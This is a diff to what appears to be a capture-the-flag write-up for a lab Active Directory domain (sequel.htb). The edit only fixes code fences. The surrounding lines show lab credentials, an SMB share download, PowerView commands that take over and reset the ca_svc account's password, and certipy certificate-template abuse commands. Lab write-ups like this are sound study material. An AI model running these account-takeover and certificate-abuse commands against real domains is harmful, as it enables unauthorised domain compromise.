@@ -100,7 +100,7 @@ rose / KxEPkKe6R8su
 Download shares 
 ```
 smbclient //10.129.232.128/"Accounting Department" -U rose
-```bash
+```
 ```bash
 echo "10.129.63.50 sequel.htb dc01.sequel.htb" | sudo tee -a /etc/hosts
 ```bash
@@ -150,10 +150,10 @@ Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
 Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan" 
 $cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force 
 Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
-```bash
+```
 ```
 certipy find -u 'ca_svc@sequel.htb' -p 'Password123!!' -dc-ip 10.129.56.175 -stdout
-```bash
+```
 ```bash
 certipy-ad template \
   -u ca_svc@sequel.htb \
